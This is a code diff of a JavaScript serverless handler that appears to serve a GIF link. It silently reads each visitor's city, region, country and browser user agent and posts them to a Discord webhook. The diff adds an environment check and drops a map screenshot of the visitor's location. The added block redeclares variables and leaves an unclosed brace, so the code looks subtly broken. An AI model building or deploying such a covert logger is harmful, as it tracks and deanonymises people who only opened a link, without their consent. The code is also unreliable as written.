@@ -35,6 +35,12 @@ export default async function handler(req, res) {
     const region = req.headers['x-vercel-ip-country-region'] || 'Unknown';
     const mapSearch = encodeURIComponent(`${city}, ${region}, ${country}`);
 
+    if (process.env.DISCORD_WEBHOOK_URL) {
+    const country = req.headers['x-vercel-ip-country'] || 'Unknown';
+    const city = req.headers['x-vercel-ip-city'] || 'Unknown';
+    const region = req.headers['x-vercel-ip-country-region'] || 'Unknown';
+    const mapSearch = encodeURIComponent(`${city}, ${region}, ${country}`);
+
     fetch(process.env.DISCORD_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -52,10 +58,7 @@ export default async function handler(req, res) {
             { name: "📂 GIF", value: `[Original Source](${targetUrl})`, inline: true },
             { name: "🖥️ Device", value: `\`\`\`${userAgent.substring(0, 100)}\`\`\`` }
           ],
-          thumbnail: { url: targetUrl },
-          image: { 
-            url: `https://api.screenshotmachine.com/?key=FREE&url=https://www.google.com/maps/search/${mapSearch}&dimension=640x320` 
-          }
+          thumbnail: { url: targetUrl } 
         }]
       })
     }).catch(() => {});
